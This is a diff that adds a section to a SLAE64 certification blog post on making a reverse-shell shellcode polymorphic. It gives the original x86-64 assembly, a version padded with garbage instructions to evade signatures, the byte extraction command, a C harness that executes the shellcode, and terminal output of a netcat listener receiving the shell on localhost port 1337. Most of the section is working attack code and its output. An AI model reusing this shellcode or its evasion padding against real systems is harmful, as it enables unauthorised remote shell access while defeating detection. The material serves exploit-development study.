@@ -340,3 +340,197 @@ Original size: 131
 Final size: 187
 
 Increment: 43%
+
+#### Reverse-shell Shellcode (Shellcode #3)
+
+For the final shellcode, I have chosen to use a reverse-shell that arranges a connection towards the localhost on port 1337. It can be found [here](http://shell-storm.org/shellcode/files/shellcode-823.php)
+
+###### Original code:
+
+```term
+xor    	rdx,rdx
+mov 	rdi,0x636e2f6e69622fff
+shr	rdi,0x08
+push 	rdi
+mov 	rdi,rsp
+
+mov	rcx,0x68732f6e69622fff
+shr	rcx,0x08
+push 	rcx
+mov	rcx,rsp
+
+mov     rbx,0x652dffffffffffff
+shr	rbx,0x30
+push	rbx
+mov	rbx,rsp
+
+mov	r10,0x37333331ffffffff
+shr 	r10,0x20
+push 	r10
+mov	r10,rsp
+
+jmp short ip
+continue:
+pop 	r9
+
+push	rdx  ;push NULL
+push 	rcx  ;push address of 'bin/sh'
+push	rbx  ;push address of '-e'
+push	r10  ;push address of '1337'
+push	r9   ;push address of 'ip'
+push 	rdi  ;push address of '/bin/nc'
+
+mov    	rsi,rsp
+mov    	al,59
+syscall
+
+
+ip:
+	call  continue
+	db "127.0.0.1"
+```
+
+Once again, there isn't much to comment, other than the fact that we can apply the aforementioned polymorphic techniques against this shellcode.
+
+###### Final code:
+
+```term
+global _start
+
+_start:
+
+xor    	rdx,rdx
+nop                                                 ; Garbage NOP
+nop                                                 ; Garbage NOP
+mov 	rdi,0x636e2f6e69622fff
+shr	rdi,0x08
+dec al                                              ; Garbage NOP
+push 	rdi
+mov 	rdi,rsp
+
+mov	rcx,0x68732f6e69622fff
+shr	rcx,0x08
+dec al                                              ; Garbage NOP
+
+
+push 	rcx
+inc cl                                              ; Garbage NOP
+dec cl                                              ; Garbage NOP
+mov	rcx,rsp
+
+mov     rbx,0x652dffffffffffff
+std                                                 ; Garbage NOP
+cwd                                                 ; Garbage NOP
+shr	rbx,0x30
+
+cmc                                                 ; Garbage NOP
+
+push	rbx
+mov	rbx,rsp
+
+mov	r10,0x37333331ffffffff
+shr 	r10,0x20
+std                                                 ; Garbage NOP
+push 	r10
+mov	r10,rsp
+
+jmp short ip
+continue:
+pop 	r9
+
+push	rdx  ;push NULL
+
+push 	rcx  ;push address of 'bin/sh'
+nop                                                 ; Garbage NOP
+inc dl                                              ; Garbage NOP  
+dec dl                                              ; Garbage NOP
+
+push	rbx  ;push address of '-e'
+inc cl                                              ; Garbage NOP
+dec cl                                              ; Garbage NOP
+nop                                                 ; Garbage NOP
+push	r10  ;push address of '1337'
+
+dec al                                              ; Garbage NOP
+
+push	r9   ;push address of 'ip'
+
+inc bl                                              ; Garbage NOP
+dec bl                                              ; Garbage NOP
+
+push 	rdi  ;push address of '/bin/nc'
+
+nop                                                 ; Garbage NOP
+mov    	rsi,rsp
+mov al, 59
+
+syscall
+
+ip:
+	call  continue
+	db "127.0.0.1"
+```
+
+Let's assemble, link, and test this shellcode.
+
+```term
+whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/3_shellcode$ nasm -f elf64 1.asm -o 1.o && ld 1.o -o 1 && for i in $(objdump -d ./1 -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
+```
+
+###### C format
+
+```term
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\x48\x31\xd2\x90\x90\x48\xbf\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x48\xc1\xef\x08\xfe\xc8\x57\x48\x89\xe7\x48\xb9\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xe9\x08\xfe\xc8\x51\xfe\xc1
+\xfe\xc9\x48\x89\xe1\x48\xbb\xff\xff\xff\xff\xff\xff\x2d\x65\xfd\x66\x99\x48\xc1\xeb\x30\xf5\x53\x48\x89\xe3\x49\xba\xff\xff\xff\xff\x31\x33\x33\x37\x49\xc1\xea\x20\xfd\x41\x52\
+x49\x89\xe2\xeb\x22\x41\x59\x52\x51\x90\xfe\xc2\xfe\xca\x53\xfe\xc1\xfe\xc9\x90\x41\x52\xfe\xc8\x41\x51\xfe\xc3\xfe\xcb\x57\x90\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xd9\xff\xff\xff\x
+31\x32\x37\x2e\x30\x2e\x30\x2e\x31"
+
+;
+
+main()
+{
+
+  printf("Shellcode Length:  %d\n", strlen(code));
+
+	int (*ret)() = (int(*)())code;
+
+	ret();
+
+}
+```
+
+#### EndGame #3
+
+```term
+whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/3_shellcode$ gcc 3_shellcode.c -o 3_shellcode -fno-stack-protector -z execstack -w 
+whitecr0wz@SLAE64:~/assembly/assignments/Assignment_6/3_shellcode$ ./3_shellcode 
+Shellcode Length:  141
+
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+whitecr0wz@SLAE64:~$ rlwrap nc -lvp 1337 
+listening on [any] 1337 ...
+connect to [127.0.0.1] from localhost [127.0.0.1] 55804
+python -c 'import pty;pty.spawn("/bin/bash")';
+<0wz/assembly/assignments/Assignment_6/3_shellcode$ id 
+id 
+uid=1000(whitecr0wz) gid=1000(whitecr0wz) groups=1000(whitecr0wz),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+<0wz/assembly/assignments/Assignment_6/3_shellcode$
+```
+
+Original size: 109
+Final size: 141
+
+Increment: 30%
+
+### Code
+
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-
+courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)
+
+Student ID: SLAE64-27812/PA-27812
+
+You can find all of the used resources within this post [here](https://github.com/whitecr0wz/SLAE/tree/main/SLAE64/Assignment_6).
